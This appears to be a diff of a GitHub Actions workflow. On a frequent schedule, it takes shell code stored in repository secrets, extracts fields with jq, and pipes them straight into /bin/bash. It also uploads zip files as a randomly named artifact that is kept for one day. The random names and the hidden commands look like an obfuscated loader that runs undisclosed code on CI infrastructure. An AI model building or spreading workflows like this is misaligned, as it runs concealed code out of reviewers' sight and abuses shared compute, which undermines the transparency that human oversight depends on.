@@ -1,26 +1,24 @@
 name: fankaixinxu
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '30 1/6 * * *'
-jobs:  # 11926
+    - cron: '6 2,8,14,20 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fankaixinxu
         env:
-          iboo0: ${{ secrets.iboo0 }}
+          xyxuv774: ${{ secrets.xyxuv774 }}
         run: |
-          echo $iboo0 | jq -r .r1666 | /bin/bash
-          echo $wz771 | jq -r .k32398 | /bin/bash
-          echo $zi714 | jq -r .jqfp069 | /bin/bash
-          echo $cm6211 | jq -r .q86090 | /bin/bash
-          echo $team0644 | jq -r .fscos1 | /bin/bash
-          echo $mknzs3747 | jq -r .deg464 | /bin/bash
-          echo $zvm5449 | jq -r .zvgkc0 | /bin/bash
-          echo $v3474 | jq -r .a4887 | /bin/bash
-          echo $vfo5 | jq -r .dmju1 | /bin/bash
+          printf '%s' "$xyxuv774" | jq -r .yhrh6539 | /bin/bash
+          echo $drij2 | jq -r .mu51 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: zJl9ASy4
+          path: "*.zip"
+          retention-days: 1
